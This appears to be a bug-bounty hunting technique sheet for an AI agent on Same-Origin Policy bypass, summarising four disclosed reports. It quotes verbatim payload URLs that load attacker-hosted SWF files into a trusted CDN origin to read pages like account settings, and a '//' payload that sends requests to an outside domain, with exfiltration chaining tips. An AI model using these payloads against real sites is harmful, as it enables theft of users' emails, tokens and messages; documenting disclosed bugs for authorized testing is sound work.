---
name: hunter-l3-same-origin-policy-bypass
description: "Use when hunting Same-Origin Policy Bypass on a target. Loads the L3 technique sheet: Same-Origin Policy (SOP) bypass is the class of bugs where attacker-controlled content or requests get executed/read in the context of a trusted origin, defeating the browser's isolation between origins."
domain: cybersecurity
subdomain: web
tags:
- web
- same-origin-policy-bypass
- hunting
- l3
version: '1.0'
---

# Same-Origin Policy Bypass — Technique Sheet

## Overview
Same-Origin Policy (SOP) bypass is the class of bugs where attacker-controlled content or requests get executed/read in the context of a trusted origin, defeating the browser's isolation between origins. It typically pays when combined with data exfiltration: reading authenticated pages (settings, tokens, private messages) cross-origin, or sending privileged cross-origin requests. The classic modern trigger surface is legacy Flash assets (`.swf` files) on CDN/crossdomain-trusted domains plus parameter-injection gadgets that load attacker content into those trusted contexts.

## Distinct sub-patterns

### 1. Uncontrolled remote-SWF loading via URL parameter on a crossdomain-trusted CDN (vpaidSwfUrl)
- **Endpoint shape / parameter:**
  `GET /static/MegaPlayer/{version}/vpaid-js-interface.swf` on a static CDN domain trusted via `crossdomain.xml` (here `st.mycdn.me`), parameter `vpaidSwfUrl` (plus `Loader`).
- **Payload that actually fired (verbatim):**
  `http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings&Loader=test`
- **Root cause:**
  A SWF hosted on a domain listed in the target's `crossdomain.xml` uses `Security.allowDomain('*')` and loads an arbitrary external SWF through the unvalidated `vpaidSwfUrl` parameter. Attacker SWF code therefore runs inside the trusted CDN origin.
- **Impact proven:**
  The attacker SWF, running on `st.mycdn.me`, fetched `http://ok.ru/settings` (allowed by crossdomain trust) and passed the content to JavaScript on the attacker's own origin (PoC `ok.html` rendered it) — theft of email, CSRF tokens, private messages, etc., with no user interaction beyond loading the crafted URL.
- **Exemplar report:** id=102234 (ok.ru).

### 2. Arbitrary SWF execution via `player` parameter on the same trusted CDN (second gadget)
- **Endpoint shape / parameter:**
  `GET /static/moderator/{version}/Main.swf` on `st.mycdn.me`, parameter `player`.
- **Payload that actually fired (verbatim):**
  `https://st.mycdn.me/static/moderator/6-1-6/Main.swf?retry_timer=30&skip_timer=8500&disableAgeCheck=true&v=55&player=https://uid0.pl/poc/xss.swf`
- **Root cause:**
  A second SWF on the crossdomain-trusted domain executes attacker-supplied SWF code from a URL parameter — the same flaw class as #1, but reached through a different asset/parameter. Multiple SWFs on one trusted CDN often share the flaw; enumerate them all.
- **Impact proven:**
  Attacker SWF (`https://uid0.pl/poc/xss.swf`) executed within the trusted `st.mycdn.me` origin, yielding the same SOP-bypass/data-theft capability.
- **Exemplar report:** id=102236 (ok.ru).

### 3. Cross-origin POST with custom headers via Flash + 307 redirect
- **Endpoint shape / parameter:**
  Browser behavior, no specific endpoint. Chain: Flash-initiated cross-origin POST → 307 redirect to the victim.
- **Payload:** none stated in the record.
- **Root cause:**
  Chrome did not respect the SOP for this flow: a POST request with custom headers, initiated via Flash and then redirected with HTTP 307, was re-sent (with the custom headers preserved, per 307 semantics) to any target website.
- **Impact proven:**
  Demonstrated cross-site POST carrying custom headers to arbitrary websites — defeating the "custom headers can't be sent cross-origin" CORS preflight protection.
- **Exemplar report:** id=42240 (Internet Bug Bounty).
- **Note:** this is a browser-vendor bug; hunt it in scope like Internet Bug Bounty, not as an app-level finding.

### 4. Open external-domain AJAX via `//` in a URL-typed parameter (no filtration of `/`)
- **Endpoint shape / parameter:**
  `GET /bugs` with parameter `subject` (a value the app treats as a relative path/URL somewhere in its handling).
- **Payload that actually fired (verbatim):**
  `/bigbob.lv/1337.php?data=`
- **Root cause:**
  The `subject` parameter has no filtration of `/`. A leading `//` makes the value a protocol-relative URL, so the app-side code (AJAX request construction) points at an external domain instead of staying on-origin. This only works in browsers without CSP, since CSP would block the outbound request.
- **Impact proven:**
  Three AJAX requests sent from `hackerone.com` to `bigbob.lv` — an SOP violation demonstrable in non-CSP browsers (e.g., IE).
- **Exemplar report:** id=97191 (HackerOne).

## Bypass / chain notes
- **crossdomain.xml trust is the amplifier:** in the ok.ru cases, the attacker never needed an XSS on ok.ru — hosting a gadget SWF on `st.mycdn.me` (trusted by ok.ru's crossdomain.xml) was enough to read ok.ru pages cross-origin. Always check `/.well-known/crossdomain.xml` (or `/crossdomain.xml`) on targets and audit which domains it trusts; then enumerate every `.swf` on those trusted domains for parameter-controlled SWF loading.
- **Chain shape for the SWF gadgets (from records):**
  1. Abuse crossdomain.xml trust of the CDN domain for the target site.
  2. Load attacker SWF via the uncontrolled URL parameter (`vpaidSwfUrl` / `player`) of the vulnerable SWF (`Security.allowDomain('*')`).
  3. Attacker SWF executes in the trusted origin, reads target-origin pages, and hands content to attacker JavaScript.
- **Multiple gadgets on one domain:** the same researcher found two independent vulnerable SWFs (`vpaid-js-interface.swf` and `Main.swf`) on the same CDN. One confirmed gadget means look for siblings — different version paths and different parameters both fired (`retry_timer`, `skip_timer`, `disableAgeCheck`, `v` were just decoy/functional params alongside the loading `player` param).
- **307 redirect semantics:** HTTP 307 preserves method and body on redirect — that's what let the Flash-initiated POST (and its custom headers) survive the hop to the victim site. The bypass is method-preserving-redirect + Flash as the request initiator.
- **CSP as a limiter, not a fix:** the `//` protocol-relative AJAX pattern only works where the origin lacks a restrictive CSP (demonstrated against IE / non-CSP browsers). Test on browser/origin combinations where CSP doesn't block the outbound request.
- **Data exfil hop:** in #102234, the SWF didn't exfiltrate directly — it passed fetched page content to JavaScript on the attacker's origin, which then rendered/used it. Building the read into the SWF and the exfil in attacker-side JS keeps each step simple.

## Gotchas / what NOT to do
- **Don't report the gadget without the crossdomain trust story:** the SWF-loading flaw only yields SOP bypass because the hosting domain is crossdomain-trusted for the target. The root cause and impact both hinge on that relationship — capture both.
- **Don't assume the flaw is unique to one file:** #102234 and #102236 are the same class on the same CDN via two different SWFs and two different parameters. Filing only one loses the second (and any third) gadget.
- **Version specificity matters:** the confirmed payloads pin exact versions (`10-2-21`, `6-1-6`). Your PoC must state which version you tested; `{version}` in the endpoint shape is a placeholder, not proof.
- **Don't overlook browser dependence:** #97191 explicitly requires a browser without CSP (IE-class); #42240 is a Chrome behavior. Scope and qualify the claim — "SOP violation possible in browsers without CSP" is the honest framing, not "SOP broken everywhere".
- **Don't stop at "request was sent":** the strongest records prove data movement — page content delivered to attacker JS (#102234), N AJAX requests demonstrated to an external domain (#97191). A mere outbound request with no read/exfil proof is a weaker report.

## Real-world impact examples
- **ok.ru (id=102234):** attacker SWF on `st.mycdn.me` read `http://ok.ru/settings` and passed the contents to attacker-origin JavaScript — exposing the user's email, CSRF tokens, and private messages, with zero user interaction.
- **ok.ru (id=102236):** arbitrary SWF (`https://uid0.pl/poc/xss.swf`) executed on the trusted CDN domain via the `player` parameter, reproducing the full SOP-bypass/data-theft capability through a second asset.
- **Internet Bug Bounty (id=42240):** cross-site POST with attacker-chosen custom headers delivered to arbitrary websites in Chrome, via Flash + 307 redirect — invalidating the CORS assumption that custom headers gate cross-origin writes.
- **HackerOne (id=97191):** `subject=/bigbob.lv/1337.php?data=` caused 3 AJAX requests from `hackerone.com` to an external domain (`bigbob.lv`), a demonstrated same-origin policy violation in non-CSP browsers.